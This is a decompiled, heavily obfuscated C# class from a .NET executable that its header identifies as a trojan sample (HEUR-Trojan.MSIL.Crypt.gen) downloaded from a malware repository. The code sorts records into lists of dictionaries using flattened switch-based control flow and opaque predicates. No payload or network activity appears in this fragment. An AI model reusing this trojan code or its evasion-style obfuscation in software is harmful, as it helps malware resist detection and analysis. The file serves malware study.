// Decompiled with JetBrains decompiler
// Type: @ԥ
// Assembly: uLqhNaw2rJQahaaHEibmS0F8CAhQ12f0pD0UHJWVCL, Version=9.1.2.0, Culture=neutral, PublicKeyToken=null
// MVID: D212B58E-19EB-4690-837D-62FC76EFC9D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c92d5d3e7959656b93039f2d0479f1cd50ca98907ea5aa0a925724b1dca475a3.exe

using System.Collections.Generic;
using System.Runtime.CompilerServices;

internal sealed class \u0040ԥ
{
  internal List<\u0040ԩ> \u0040ӓ;
  internal static object \u0040Ӕ;
  internal static object \u0040ӕ;
  internal static object \u0040Ӗ;
  internal static object \u0040ӗ;
  internal static object \u0040Ә;
  internal static object \u0040ә;
  internal static object \u0040Ӛ;
  public \u0040Ԫ \u0040ӛ;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0040ԥ(\u0040Ԫ _param1, \u0040ԩ[] _param2 = null)
  {
    int num = 10;
    while (true)
    {
      bool flag1;
      bool flag2;
      switch (num)
      {
        case 0:
          \u0040ԝ.\u0040ڰ(_param2, this);
          num = 12;
          continue;
        case 1:
          flag1 = _param2 != null;
          num = 3;
          continue;
        case 3:
          if (flag1)
          {
            num = 0;
            continue;
          }
          goto label_9;
        case 4:
          \u0040ԥ.\u0040Ӟ((object) this);
          num = 11;
          continue;
        case 5:
        case 7:
          if (!flag2)
            goto case 1;
          else
            break;
        case 8:
          flag2 = \u0040ԥ.\u0040Ӕ == null;
          if (\u0040ԥ.\u0040ӟ())
          {
            if (true)
            {
              num = 7;
              continue;
            }
            goto case 5;
          }
          else
          {
            num = 2;
            continue;
          }
        case 9:
          this.\u0040ӓ = new List<\u0040ԩ>();
          if (!\u0040ԥ.\u0040Ӡ())
          {
            num = 4;
            continue;
          }
          goto label_16;
        case 10:
          \u0040ԥ.\u0040ӝ();
          num = 9;
          continue;
        case 11:
          this.\u0040ӛ = _param1;
          if (!\u0040ԥ.\u0040Ӡ())
          {
            num = 8;
            continue;
          }
          goto case 8;
        case 12:
          goto label_16;
      }
      \u0040ԝ.\u0040Ӻ(this);
      num = 1;
    }
label_9:
    return;
label_16:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal void \u0040Ӝ(
    out List<Dictionary<string, string>> _param1,
    out List<Dictionary<string, string>> _param2,
    out List<Dictionary<string, string>> _param3)
  {
    int num1 = 4;
    List<\u0040ԩ>.Enumerator enumerator;
    while (true)
    {
      switch (num1)
      {
        case 0:
          enumerator = this.\u0040ӓ.GetEnumerator();
          num1 = 6;
          continue;
        case 1:
        case 3:
          _param2 = new List<Dictionary<string, string>>();
          goto case 2;
        case 2:
        case 5:
          _param3 = new List<Dictionary<string, string>>();
          goto case 0;
        case 4:
          _param1 = new List<Dictionary<string, string>>();
          num1 = \u0040ԥ.\u0040Ӡ() ? 5 : 3;
          continue;
        case 6:
          goto label_7;
        default:
          if (\u0040ԥ.\u0040ӟ())
          {
            num1 = 0;
            continue;
          }
          goto case 4;
      }
    }
label_7:
    try
    {
      while (enumerator.MoveNext())
      {
        \u0040ԩ current = enumerator.Current;
        \u0040ԥ.\u0040ӟ();
        int num2;
        if (!\u0040ԥ.\u0040Ӡ())
        {
          num2 = 7;
          goto label_16;
        }
        else
        {
          num2 = 8;
          if (true)
            goto label_16;
        }
label_13:
        bool flag1 = current.\u0040ӛ();
        num2 = 3;
label_16:
        bool flag2;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 7:
              goto label_13;
            case 1:
            case 6:
              goto label_22;
            case 2:
            case 8:
              _param1.Add(new Dictionary<string, string>()
              {
                [(string) \u0040ԥ.\u0040Ә] = current.\u0040Ә(),
                [(string) \u0040ԥ.\u0040ә] = current.\u0040ә()
              });
              num2 = 6;
              continue;
            case 3:
              if (!flag1)
              {
                flag2 = current.\u0040Ӝ();
                goto case 5;
              }
              else
                goto case 2;
            case 4:
              _param2.Add(new Dictionary<string, string>()
              {
                [(string) \u0040ԥ.\u0040Ә] = current.\u0040Ә(),
                [(string) \u0040ԥ.\u0040ә] = current.\u0040ә(),
                [(string) \u0040ԥ.\u0040Ӛ] = current.\u0040Ӛ()
              });
              if (\u0040ԥ.\u0040ӟ())
              {
                num2 = 1;
                continue;
              }
              goto case 3;
            case 5:
              while (!flag2)
              {
                _param3.Add(new Dictionary<string, string>()
                {
                  [(string) \u0040ԥ.\u0040Ә] = current.\u0040Ә(),
                  [(string) \u0040ԥ.\u0040ә] = current.\u0040ә(),
                  [(string) \u0040ԥ.\u0040Ӛ] = current.\u0040Ӛ()
                });
                if (true)
                {
                  num2 = 9;
                  goto label_16;
                }
              }
              if (true)
              {
                num2 = 4;
                continue;
              }
              goto label_21;
            case 9:
              goto label_21;
            default:
              num2 = 5;
              continue;
          }
        }
label_21:
label_22:;
      }
    }
    finally
    {
      enumerator.Dispose();
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӝ() => \u0040ո.\u0040Ӕ();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӟ(object _param0) => _param0.\u002Ector();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӟ() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӡ() => false;
}
